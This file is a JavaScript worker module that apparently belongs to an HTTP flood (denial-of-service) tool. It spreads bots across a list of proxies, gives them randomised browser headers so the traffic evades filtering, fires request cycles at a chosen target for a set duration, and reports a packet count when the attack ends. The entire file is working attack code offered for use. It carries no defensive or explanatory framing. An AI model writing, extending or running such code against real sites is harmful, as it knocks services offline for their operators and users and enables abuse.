import { parentPort, workerData } from "worker_threads";

import HTTPBot from "../utils/httpBot.js";
import { randomItem } from "../utils/randomUtils.js";

const HTTP_ACCEPT_HEADERS = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
];

const HTTP_LANGUAGE_HEADERS = [
  "en-US,en;q=0.5",
  "es-ES,en;q=0.5",
  "fr-FR,en;q=0.5",
  "de-DE,en;q=0.5",
  "it-IT,en;q=0.5",
  "pt-BR,en;q=0.5",
];

const HTTP_ENCODING_HEADERS = [
  "gzip, deflate, br",
  "gzip, deflate",
  "gzip",
  "deflate, br",
  "deflate",
  "br",
];

const startAttack = () => {
  const { target, proxies, userAgents, duration } = workerData;
  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;

  let totalPackets = 0;
  const pool = new Set();

  const createBot = (proxy) => {
    const bot = new HTTPBot({
      proxy,
      userAgent: randomItem(userAgents),
      followRedirects: true,
      headers: {
        Accept: randomItem(HTTP_ACCEPT_HEADERS),
        "Accept-Language": randomItem(HTTP_LANGUAGE_HEADERS),
        "Accept-Encoding": randomItem(HTTP_ENCODING_HEADERS),
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      responseCallback: (error) => {
        if (error) {
          parentPort.postMessage({
            log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
            totalPackets,
          });
        } else {
          totalPackets++;
          parentPort.postMessage({
            log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
            totalPackets,
          });
        }
      },
    });

    pool.add(bot);
    bot.startCycle(fixedTarget);
  };

  const createPool = () => {
    proxies.forEach((proxy) => createBot(proxy));
  };

  const clearPool = () => {
    pool.forEach((bot) => bot.stopCycle());
    pool.clear();
  };

  setTimeout(() => {
    clearPool();
    parentPort.postMessage({ log: "Attack finished", totalPackets });
    process.exit(0);
  }, duration * 1000);

  createPool();
};

if (workerData) {
  startAttack();
}
